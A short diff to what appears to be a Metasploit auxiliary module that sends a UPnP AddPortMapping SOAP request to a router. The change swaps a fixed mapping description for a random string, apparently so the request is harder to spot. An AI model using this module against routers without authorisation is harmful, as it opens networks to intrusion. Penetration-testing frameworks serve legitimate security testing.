@@ -5,6 +5,7 @@
 ##
 
 require 'msf/core'
+
 class Metasploit3 < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
@@ -36,7 +37,7 @@ class Metasploit3 < Msf::Auxiliary
     content << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
     content << "<SOAP-ENV:Body>"
     content << "<m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
-    content << "<NewPortMappingDescription>New Port Mapping</NewPortMappingDescription>"
+    content << "<NewPortMappingDescription>#{Rex::Text.rand_text_alpha(8)}</NewPortMappingDescription>"
     content << "<NewLeaseDuration>3600</NewLeaseDuration>"
     content << "<NewInternalClient>#{datastore['INTERNAL_CLIENT']}</NewInternalClient>"
     content << "<NewEnabled>1</NewEnabled>"
